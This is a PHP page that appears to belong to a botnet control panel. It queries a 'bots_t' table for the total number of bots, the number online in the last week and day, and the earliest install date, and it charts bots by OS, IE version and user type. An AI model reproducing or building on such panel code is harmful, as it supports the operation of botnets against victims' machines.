<?
	include_once "../common.php";
	if( !$user->Check() ) exit;
	
	include_once ROOT_PATH.'/plugins/ofc/php-ofc-library/open_flash_chart_object.php';

	$sql = "SELECT COUNT(*) FROM bots_t"; 
	$res = $db->query($sql);
	$mres = $res->fetch_array();
	$all_bots = $mres[0];

	$sql = "SELECT COUNT(*) FROM bots_t WHERE date_last_online_bot >= ( CONVERT_TZ(now(),@@time_zone,'+0:00')  - INTERVAL 1 WEEK)"; 
	$res = $db->query($sql);
	$mres = $res->fetch_array();
	$num_week = $mres[0];
	$num_week_perc = round($num_week*100/($all_bots + 0.0000001));

	$sql = "SELECT COUNT(*)FROM bots_t WHERE date_last_online_bot >= ( CONVERT_TZ(now(),@@time_zone,'+0:00')  - INTERVAL 1 DAY)"; 
	$res = $db->query($sql);
	$mres = $res->fetch_array();
	$num_24 = $mres[0];
	$num_24_perc = round($num_24*100/($all_bots + 0.0000001));

	$sql = "SELECT MIN(date_install_bot) FROM bots_t"; 
	$res = $db->query($sql);
	$mres = $res->fetch_array();
	$activity_date = $mres[0];

	$create_date = gmdate("m/d/y H:i", $mres['start_date']);
	
	$smarty->assign('NUM_WEEK_PERC', $num_week_perc);
	$smarty->assign('NUM_WEEK', $num_week);
	$smarty->assign('NUM_24', $num_24);
	$smarty->assign('NUM_24_PREC', $num_24_perc);
	$smarty->assign('ACTIVITY_DATE', $activity_date);
	$smarty->display('botstat.tpl');
	
?>
<?php open_flash_chart_object( 400, 400, './mod/bot_stat.php?by=os', true, 'plugins/ofc/');?>
<br>
<?php open_flash_chart_object( 400, 400, './mod/bot_stat.php?by=ie', true, 'plugins/ofc/');?>
<br>
<?php open_flash_chart_object( 400, 400, './mod/bot_stat.php?by=user_type', true, 'plugins/ofc/');?>

